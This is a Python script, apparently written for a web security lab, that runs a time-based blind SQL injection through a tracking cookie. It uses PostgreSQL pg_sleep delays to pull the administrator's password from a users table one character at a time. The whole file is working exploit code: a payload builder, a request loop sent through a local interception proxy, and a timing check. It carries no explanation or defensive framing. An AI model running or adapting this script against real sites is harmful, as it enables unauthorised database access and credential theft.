# Import necessary modules
import sys
import requests
import urllib3
import urllib

# Disable warnings about insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxy settings
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Function to extract the password using blind-based SQL injection
def sqli_password(url):
    password_extracted = ""  # Variable to store the extracted password
    # Loop through each character position (assuming password length up to 20 characters)
    for i in range(1, 21):
        # Loop through ASCII characters (printable range) to guess each character of the password
        for j in range(32, 126):
            # Construct SQL injection payload to check if character guess is correct
            sql_payload = "' || (select case when (username='administrator' and ascii(substring(password,%s,1))='%s') then pg_sleep(10) else pg_sleep(-1) end from users)--" % (i, j)
            # URL encode the SQL injection payload
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            # Set cookies for the request with the SQL injection payload
            cookies = {'TrackingId': '1njoBZAvTqXsW5Xo' + sql_payload_encoded, 'session': 'oHjpQuJgDFNEQEKFuy952NaDKiE6WTUt'}
            # Send the GET request with cookies, ignoring SSL verification, and using proxies
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            
            # Check if the response time is greater than 9 seconds (indicating successful guess)
            if int(r.elapsed.total_seconds()) > 9:
                password_extracted += chr(j)  # Add the guessed character to the extracted password
                sys.stdout.write('\r' + password_extracted)  # Update and flush the output on the same line
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))  # Update and flush the output with the guessed character
                sys.stdout.flush()

# Main function to execute the blind-based SQL injection attack
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]  # Get the target URL from command-line argument
    print("(+) Retrieving administrator password...")
    sqli_password(url)  # Call the blind-based SQL injection function

# Entry point of the script
if __name__ == "__main__":
    main()  # Call the main function to start the attack
